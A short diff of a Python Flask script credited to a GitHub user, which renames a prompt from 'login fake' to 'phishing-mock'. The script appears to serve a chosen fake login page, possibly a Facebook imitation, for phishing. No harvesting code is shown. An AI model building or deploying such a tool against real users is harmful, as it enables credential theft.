@@ -10,7 +10,7 @@ Link
 app = Flask(__name__)
 print("By bossgeeg123456 : https://github.com/BoszGTec")
 
-print("Follow This Format : <Your Path To>/login fake/")
+print("Follow This Format : <Your Path To>/phishing-mock/")
 path=input("Your Path :  ")
 
 print("Choose page [index.html] [face.html]")
